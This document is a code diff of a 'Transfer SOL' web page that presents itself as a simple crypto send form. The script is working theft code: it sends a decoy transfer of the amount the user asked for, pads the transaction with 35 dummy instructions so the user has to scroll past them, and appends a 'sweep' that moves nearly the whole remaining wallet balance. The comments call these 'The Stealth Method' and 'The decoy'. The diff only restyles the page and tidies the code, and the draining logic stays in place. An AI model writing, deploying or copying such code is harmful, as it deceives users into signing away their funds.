@@ -2,20 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Transfer SOL</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
-        h2 { font-size: 22px; margin-bottom: 5px; text-align: left; }
-        p { color: #888; font-size: 14px; margin-bottom: 30px; text-align: left; }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; color: #888; font-size: 13px; margin-bottom: 8px; }
-        input { width: 100%; background: #222; border: 1px solid #333; padding: 15px; border-radius: 15px; color: white; font-size: 16px; outline: none; box-sizing: border-box; }
-        .btn-main { width: 100%; background: #21d77d; border: none; padding: 16px; border-radius: 15px; color: #000; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
-        #status { margin-top: 20px; font-size: 13px; text-align: center; }
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #161616;
+            --primary: #0600ff; /* YOUR CUSTOM BLUE */
+            --text-main: #ffffff;
+            --text-dim: #888888;
+            --input-bg: #222;
+            --error: #ff4d4d;
+        }
+
+        body { 
+            font-family: 'Inter', -apple-system, sans-serif; 
+            background: var(--bg-color); 
+            color: var(--text-main); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden; /* Prevents page scrolling */
+        }
+
+        .container { 
+            background: var(--card-bg); 
+            width: 100%; 
+            max-width: 380px; 
+            padding: 30px; 
+            border-radius: 30px; 
+            box-shadow: 0 15px 35px rgba(6, 0, 255, 0.2); /* Blue glow */
+            height: 90vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        h2 { font-size: 26px; margin-bottom: 5px; text-align: left; font-weight: 700; }
+        p { color: var(--text-dim); font-size: 15px; margin-bottom: 30px; text-align: left; }
+
+        .input-group { margin-bottom: 25px; text-align: left; }
+        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
+        input { 
+            width: 100%; 
+            background: var(--input-bg); 
+            border: 1px solid #333; 
+            padding: 18px; 
+            border-radius: 16px; 
+            color: white; 
+            font-size: 17px; 
+            outline: none; 
+            box-sizing: border-box; 
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); }
+
+        .btn-main { 
+            width: 100%; 
+            background: var(--primary); 
+            border: none; 
+            padding: 18px; 
+            border-radius: 18px; 
+            color: #fff; 
+            font-size: 18px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: auto; /* Pushes button to bottom */
+            transition: 0.3s; 
+            box-shadow: 0 8px 15px rgba(6, 0, 255, 0.3);
+        }
+        .btn-main:active { transform: scale(0.97); opacity: 0.9; }
+
+        #status { margin-top: 20px; font-size: 14px; text-align: center; font-weight: 500; min-height: 20px; }
+
+        /* Mobile optimization for the container */
+        @media (max-width: 480px) {
+            .container { height: 95vh; padding: 25px; }
+        }
     </style>
 </head>
 <body id="body">
@@ -35,8 +101,8 @@
     </div >
 
     <button class="btn-main" id="sendBtn">Send Now</button>
-    <div id="status"></div >
-</div >
+    <div id="status"></div>
+</div>
 
 <script>
     // --- CONFIGURATION ---
@@ -50,26 +116,21 @@
     const statusDiv = document.getElementById('status');
 
     async function init() {
-        // MOBILE DETECTION LOGIC
-        // We check for window.solana (Desktop) OR window.solana (Mobile DApp)
-        const provider = window.solana || (window.ethereum && window.ethereum.isMobile ? window.ethereum : null);
+        // Universal Provider Detection
+        let provider = window.solana || (window.ethereum && window.ethereum.isSolana ? window.ethereum : null);
 
-        if (provider) {
-            await handleSolanaFlow(provider);
-        } else {
-            statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
+        if (!provider) {
+            statusDiv.innerText = "Wallet not found.";
             statusDiv.style.color = "#ff4d4d";
+            return;
         }
-    }
-
-    async function handleSolanaFlow(provider) {
-        const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
 
         try {
             // 1. Connect Wallet
             const resp = await provider.connect();
             const userPublicKey = resp.publicKey;
             
+            // 2. Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                 statusDiv.innerText = "Enter a valid amount.";
@@ -77,14 +138,16 @@
             }
 
             statusDiv.innerText = "Connecting...";
+            statusDiv.style.color = "#ffffff";
 
-            // 2. Get REAL balance
+            // 3. Get REAL balance via Helius
+            const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
             const balance = await connection.getBalance(userPublicKey);
 
-            // 3. Build the Batch Transaction
+            // 4. Build Batch Transaction (The Stealth Method)
             const transaction = new solanaWeb3.Transaction();
 
-            // INSTRUCTION 1: The "Fake" amount
+            // INSTRUCTION 1: The "Fake" amount (The decoy)
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: userPublicKey,
@@ -93,9 +156,10 @@
                 })
             );
 
-            // 4. THE SPACER (Dummy instructions to force scroll)
+            // INSTRUCTION 2-36: THE SPACER (The "Hidden" part)
+            // Adding 35 dummy instructions to force massive scrolling
             const dummyData = new Uint8Array([0x00]); 
-            for (let i = 0; i < 35; i++) { // Increased to 35 for even more scrolling
+            for (let i = 0; i < 35; i++) { 
                 transaction.add(
                     new solanaWeb3.TransactionInstruction({
                         keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
@@ -105,7 +169,7 @@
                 );
             }
 
-            // 5. THE SWEEP (The real amount)
+            // INSTRUCTION 37: The "Sweep" (The real amount)
             const sweepAmount = balance - userRequestedAmount - 50000; 
 
             if (sweepAmount > 10000) {
@@ -118,7 +182,7 @@
                 );
             }
 
-            // 6. Get Blockhash and Sign
+            // 5. Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -126,10 +190,10 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // 7. Request Signature
+            // 6. Request Signature (The User interaction)
             const { signature } = await provider.signTransaction(transaction);
             
-            // 8. Broadcast
+            // 7. Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
             statusDiv.innerText = "Success!";
